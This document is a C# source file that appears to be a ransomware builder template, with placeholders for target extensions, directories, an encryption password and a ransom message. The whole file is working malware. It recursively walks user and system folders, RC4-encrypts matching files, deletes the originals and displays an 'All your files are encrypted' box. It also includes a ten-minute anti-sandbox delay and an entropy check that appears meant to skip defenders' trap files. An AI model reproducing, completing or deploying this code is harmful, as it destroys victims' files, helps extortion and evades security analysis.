using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;

class Program
{
    static readonly string[] suffixes = { #SUFFIES# };
    static readonly string encryptedSuffix = #ENCRYPTED_SUFFIX#;
    static readonly string password = #PASSWORD#;
    static readonly bool antiSandbox =#SANDBOX#;
    static readonly bool antiTrap =#TRAP#;
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, int options);
    [DllImport("kernel32.dll")]
    public static extern uint GetTickCount();
    static void Main()
    {
        if (antiSandbox)
            Sleep(1000 * 60 * 10);
        List<string> rootDirectory =new List<string> {#DIRECTORIES#};
        List<string> list = new List<string>
        {
            "APPDATA", "HOMEDRIVE", "HOMEPATH", "LOCALAPPDATA",
            "ProgramData", "ProgramFiles", "ProgramFiles(x86)",
            "ProgramW6432", "TEMP", "USERPROFILE"
        };
        rootDirectory=ReplaceEnviron(list,rootDirectory);
        foreach (var item in rootDirectory)
        {
            TraverseFolders(item);
        }
        MessageBox(IntPtr.Zero, #MSG#, "All your files are encrypted", 16);

    }
    static List<string> ReplaceEnviron(List<string> varList, List<string> sList)
    {
        List<string> ret = new List<string>();

        foreach (string ss in sList)
        {
            string modifiedSs = ss;
            foreach (string i in varList)
            {
                modifiedSs = modifiedSs.Replace("%" + i.ToUpper() + "%", Environment.GetEnvironmentVariable(i));
            }
            ret.Add(modifiedSs);
        }

        return ret;
    }
    static double CalculateEntropy(byte[] data)
    {
        int dataSize = data.Length;
        Dictionary<byte, int> byteCount = new Dictionary<byte, int>();
        double entropy = 0.0;

        foreach (byte b in data)
        {
            if (byteCount.ContainsKey(b))
            {
                byteCount[b]++;
            }
            else
            {
                byteCount[b] = 1;
            }
        }

        foreach (var kvp in byteCount)
        {
            double probability = (double)kvp.Value / dataSize;
            entropy -= probability * Math.Log(probability, 2);
        }

        return entropy;
    }
    static void Sleep(int milliseconds)
    {
        uint startTime = GetTickCount();

        while (true)
        {
            uint currentTime = GetTickCount();
            uint elapsedMs = currentTime - startTime;

            if (elapsedMs >= milliseconds)
            {
                break;
            }
        }
    }
    static bool CheckSuffix(string path)
    {
        return Array.Exists(suffixes, delegate (string item) { return item == Path.GetExtension(path); });
    }

    static void TraverseFolders(string rootDirectory)
    {
        try
        {
            string[] directories = Directory.GetDirectories(rootDirectory);
            string[] files = Directory.GetFiles(rootDirectory);
            foreach (string directory in directories)
            {
                if (!(directory.Length >= 3 && directory.IndexOf('$') != -1) && (File.GetAttributes(directory) & FileAttributes.System) != FileAttributes.System)
                {
                    TraverseFolders(directory);
                }
            }
            foreach (string file in files)
            {
                if ((File.GetAttributes(file) & FileAttributes.System) != FileAttributes.System && CheckSuffix(file))
                {
                    Console.WriteLine(file);
                    EncryptFile(file);
                }
            }
        }
        catch (UnauthorizedAccessException)
        {
            Console.WriteLine("Access to {0} is denied.", rootDirectory);
        }
        catch (DirectoryNotFoundException)
        {
            Console.WriteLine("{0} directory not found.", rootDirectory);
        }
    }

    public static void EncryptFile(string filePath)
    {
        try
        {
            long fileSize = new FileInfo(filePath).Length;

            if (fileSize > 512 * 1024 * 1024)
            {
                Console.WriteLine("File size exceeds 512MB and will be ignored.");
                return;
            }
            else
            {
                byte[] fileBytes = File.ReadAllBytes(filePath);
                if (antiTrap)
                {
                    double result=Math.Round(CalculateEntropy(fileBytes), 2);
                    Console.WriteLine(result);
                    if (result == 6.39)
                        return;
                }
                byte[] encryptedBytes = RC4Encrypt(fileBytes);
                File.Delete(filePath);
                File.WriteAllBytes(filePath + encryptedSuffix, encryptedBytes);
            }

            Console.WriteLine("File encryption successful!");
        }
        catch (Exception ex)
        {
            try
            {
                File.Delete(filePath + encryptedSuffix);
            }
            catch
            {
            }
            Console.WriteLine("An error occurred while encrypting the file: " + ex.Message);
        }
    }

    static byte[] RC4Encrypt(byte[] input)
    {
        byte[] keyBytes = Encoding.ASCII.GetBytes(password);
        byte[] S = new byte[256];
        byte[] output = new byte[input.Length];

        for (int i = 0; i < 256; i++)
        {
            S[i] = (byte)i;
        }

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + S[i] + keyBytes[i % keyBytes.Length]) % 256;
            Swap(S, i, j);
        }

        int x = 0;
        int y = 0;
        for (int i = 0; i < input.Length; i++)
        {
            x = (x + 1) % 256;
            y = (y + S[x]) % 256;
            Swap(S, x, y);
            output[i] = (byte)(input[i] ^ S[(S[x] + S[y]) % 256]);
        }

        return output;
    }

    static void Swap(byte[] arr, int i, int j)
    {
        byte temp = arr[i];
        arr[i] = arr[j];
        arr[j] = temp;
    }
}
